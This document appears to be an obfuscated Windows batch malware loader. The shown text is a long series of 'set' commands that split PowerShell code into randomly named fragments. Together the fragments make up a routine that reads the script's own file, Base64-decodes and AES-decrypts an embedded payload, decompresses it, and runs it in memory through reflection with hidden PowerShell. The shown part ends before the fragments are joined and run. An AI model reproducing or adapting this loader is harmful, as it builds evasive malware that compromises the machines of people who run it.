@echo off
set "CAiiszcqox=form"
set "cDyrncwkkX=File"
set "imHyDfMtBR=m(, "
set "vGtWJvQECY= '')"
set "ggAxsKSdwh=ay()"
set "gBZpTZMKEW=embl"
set "UxcbMDLQZi=$VyA"
set "iqKBZiWwXm=se()"
set "BJNiQRJROo=PTtG"
set "ibWtadwjqd=S46e"
set "UZvSVIsfnI=::De"
set "eypqLEWzLA=.IO."
set "CGRdzLDtCo=$VyA"
set "vKejwzBIUK=ode]"
set "qyGNBHiZHx=em.I"
set "CKcYcGyLJw=uhgj"
set "VarkoIArbD=Syst"
set "IUwZdXbjWM= [Sy"
set "CwGvGWFuQw=Secu"
set "HLGAnTexgg=tem."
set "ogVctZifhK=ewLi"
set "vFiEOSHccd='gni"
set "AWifgLuxKy=[Env"
set "nbMvoRkOsu=$wVn"
set "QJootvdbNE=p = "
set "ZLIIupubDk=yTo("
set "vNKkDgaHxp=Obje"
set "XvwylesJjj= if "
set "sUDpstWMYz=, $V"
set "HrnojJTjPx=null"
set "ezHtiNmNVP=CckS"
set "IwWsPpRWSV=yste"
set "PXJpnSNrfc=Bmor"
set "OvzYRSExuu=ZsG "
set "kjhEoljhdL=pStr"
set "DTygbRwQrR=ateD"
set "RlLQbXcKVn=] -j"
set "aLjTTmfUWg=($cH"
set "AkOWxUlPRo='')("
set "aPRrqzxHuP=ing("
set "hgofkXgTyg=l5E7"
set "EFnjJgGQSj=ert]"
set "GqiOOXxQYH=p, 0"
set "XFaeGbQCWW=dj0C"
set "BWXZOsgeqc=kS);"
set "HjaHLzjgMj=y.Pa"
set "DBPzkxkllK=nirt"
set "ARNifAtnVg=S) {"
set "yVVTVHjRZC=vert"
set "KVoCiPQgPo=CPyl"
set "AacPMvAojL=CPyl"
set "zYPPPMyCjf=yste"
set "TdEzbXOheK=hp);"
set "XiFhmuWqyT=-nop"
set "AEjGAmrFyL=em.C"
set "ZEhUEasING=Disp"
set "SZgZmkLISI=O.Su"
set "vCYtNQGzmI=1..-"
set "XtKmOQDSVt=[Sys"
set "tgauxhkTZw=.Dis"
set "SkSgUmYpBx=n ''"
set "EDDUJJQTPA=L4Yi"
set "UjNbPXhLuM=tryP"
set "BSZSMJpaWN=ach "
set "ODfLGnDgft=p = "
set "zmkMoJlPZu=16] "
set "hpwjHfzpvP=..-1"
set "YBtKuYxwqi=ose("
set "nSdhcEAXkK=('%~f0'"
set "FoyYBMqQxf=;$bJ"
set "vkXrxkcgbP=ion."
set "bQbobcIRpQ=gjYA"
set "zekpwdkhRl=u = "
set "SyNTCkNwif=ss -"
set "CzcVjQzJwc=in $"
set "fVVONVebqD=pose"
set "FwogunwgoD=ptog"
set "lAsqetFDjC=lit("
set "YOZjvkISOq=.-16"
set "CzGGdbcbrE=$dmj"
set "oodnZYwfhV=);$h"
set "SHadkpSlBh=.Key"
set "DTocQHwPsh=eMVs"
set "CNsbFzlfeH=$fYN"
set "KTObWoikKu=t Sy"
set "SOVOHHVjXs=esMa"
set "LztCBcGCAz= '')"
set "wOuyQTGPDM=oin "
set "mnexDOWdHm=)($A"
set "EuNCeEVShZ=oL'["
set "cCJCRXvuTR=.Mem"
set "IhOoscNIUb=ispo"
set "wZsgcjZpRy=;$dm"
set "TsKlZQfKDI=[IO."
set "acmjKvklau=ddin"
set "KDAzGpunhR=ypto"
set "LdfppoymDV=tS46"
set "NdndBcqBhD=; };"
set "gLrBMfOzFH=;$fY"
set "QVzoTNddmU=.Cop"
set "LgrJSbtseM=stem"
set "agPVVOniDL=F'[-"
set "tilqhoZGwq=eam("
set "GVfnnQmIwc=rtS4"
set "bpmyOcJKVm=brea"
set "IkJLZIeWoU=.Ass"
set "VOlsAZJFiF=comp"
set "RmMYhLuZMq=m.IO"
set "gtDJvZDynI==');"
set "yuwQKJNbur=pher"
set "zGzDgKmFQR=();$"
set "OlOotGBVNU=();$"
set "gFgsqQJfNR=3); "
set "EjNXYZywKC=CPyl"
set "oGtkPpXZbF=);$K"
set "PrelncMHbG=.Cry"
set "JzCiMpSSst=ne);"
set "VCaquczHfz=and "
set "YhKTNihuSn= = $"
set "OshPgcHRlp=.Cre"
set "EaQiauMaHz='[-1"
set "CRwNsDwGip=vdo."
set "kUjBzsMrGu=VyAh"
set "bjTFteexOD=Ngu."
set "cIjySWLXcn=('da"
set "YJXryXcxFL=VyAh"
set "RgVrFaIHwE=ress"
set "lTMhFRbtEN=$Kuh"
set "MlNDrkGLqV=y.Ci"
set "BHSwaDGeeP=join"
set "uSlGBHjGaT=bjec"
set "PNMhYSDuFo=hp ="
set "QwNqNvcaEX== $t"
set "yHWcvOtVoM= [st"
set "LbrMUhnJPS=VyAh"
set "PdzgDasWZC=);$t"
set "jUZZFXPnCn=ose("
set "yukGecFtqX=CFxo"
set "zULqUtILPk=]::C"
set "SFcmJqmfBn=mory"
set "IkZmyNHHPR=orF'"
set "scLhFAMRug=morF"
set "UEciKmziHg=kS.T"
set "VYOAJXGctS=$hCc"
set "VbfaSzyGrg=Fina"
set "uRsyUeWAVY=rans"
set "XIwgVwmbfk=ect "
set "LbViWzWhXB=[Sys"
set "mwiyugrWlL=gj.D"
set "ojhenpRUHK=;$dm"
set "XtSXKTGZzv=saBm"
set "fVhaZsJZsh=tion"
set "GYuwNznfhz=-1.."
set "fazMXFLTEy=tSO "
set "dUDtcTPcNC=-joi"
set "oRVBoPplEH=pose"
set "gaEgOJWyXI=Mode"
set "RqBkAaBoMJ=.Dis"
set "LauXqdAOXt=sion"
set "NRhYuvHpCH=New-"
set "sYmgPNCEJk=V = "
set "XMvBZubJxt= = N"
set "GLPtfuJEVE=BC;$"
set "aSVEQQdcbY=wVnS"
set "VKpAykpBSw='[-1"
set "BZWSZJsYKP=6] -"
set "IpoVRloJTv=Invo"
set "gjtDEucquA=..-1"
set "otRWnVPpHY=ionM"
set "guIbVJrcwk=flec"
set "zHRxJNVnQG='txe"
set "dIFvSkOZEk=ct S"
set "eCftbsicpx=ck($"
set "mqtBSxsAxW=-4] "
set "yajoqMGwnM=$hCc"
set "RrRdVAxZid=RmAx"
set "EDFDfdnMLs=n ''"
set "arCtRZwhLh=g = "
set "PjDqYtHqHb=PxEW"
set "uyqPDoDQzA=th('"
set "mlEClqywzA= [Sy"
set "zPmuXargeJ=.Con"
set "mxcEaUfgmY=zuZI"
set "WQeyttjZFV=.Mod"
set "tBCvBGwCqa=Comp"
set "fOSyabsWbv='0Pg"
set "oVFCZaamZJ=esaB"
set "yaiQyzlxZT=m.IO"
set "OwalWwKstj=CPyl"
set "aeSvPClVBs=gnir"
set "MmSHiHWWyO=106u"
set "nQXluBhGQf=e]::"
set "BqXhbaXRSw=oint"
set "BGwMTVAOWT=oArr"
set "TLwmcUMxMn=tem."
set "SHgfIrbZMh=ring"
set "RAyEEMHHPH=tCPy"
set "HwJlISENDC=();$"
set "DGCosWLMgA=gMod"
set "nvQiKGCZeV=::('"
set "OtksjRacQs=grap"
set "ZrPUtfhrdk=nage"
set "BKWEXkbyxp=Secu"
set "dgOsDpmILA=comm"
set "BUYhICrlXD=jUq."
set "SkPYLKvtdk=Kuhg"
set "OlHfXhDLdD=yl.I"
set "LgLnPFmulm=New-"
set "dsyDFWLHzl=Disp"
set "ycnzJxJXQc=.Cry"
set "iyvaWNPqBc=O.Me"
set "ClRUvHGqXe=G.En"
set "vRvJpUbPdF=Conv"
set "tiWDDAvNDM=y]::"
set "YfWFhSSyBc=CPyl"
set "aDLKPoteSb=);$t"
set "bQFXnYVYMP=  $A"
set "rwqTWpvCRR=yAhp"
set "qugDLbTHoS===')"
set "vmxxzfHiwF= New"
set "VrdIfqqUig=gth)"
set "RMuiYgrPCg=le  "
set "KDHFDOooTj=tem."
set "ExFNcsiCXd=join"
set "mxQDtRbNPU=kS ="
set "QIBkIiPaHk=)) {"
set "QkdqNMAMcJ=ment"
set "urBOzzbJFn=Stre"
set "UsJJabHMoP=7;$t"
set "addwrqBMSG=ress"
set "TCrBtijTZE=raph"
set "ohOHvEJfWq=l.Pa"
set "DqJDNqZChp=, (,"
set "RlrnjuKgba=iron"
set "QmQaNNfclI=pres"
set "aFYJrgtvSp=6esa"
set "UbWnUJEFAl=).Sp"
set "vdytdQXHBx=j = "
set "LZTYaVLlzk=hy.A"
set "JtwQCHkuwO=]::("
set "YhWNFUholt= = ["
set "nOIrrZuuzZ=-joi"
set "tyTAMOYSPo=:: '"
set "yuTSXOIUoS=tsWi"
set "dQxkOdlnSe=zHhH"
set "meMdtYswkD=[-1."
set "gZUnryCpFD=fYNg"
set "ViQwtxpXjK=ptor"
set "jnBWYZRrun=oryS"
set "pwhZpxpYNB=rt]:"
set "fSFhVILPvO=);$b"
set "JGQCanamJG=)($V"
set "mJGzNqWFfA=stem"
set "nvyBUeAOZs=.Sec"
set "QobLMciPIN=k; }"
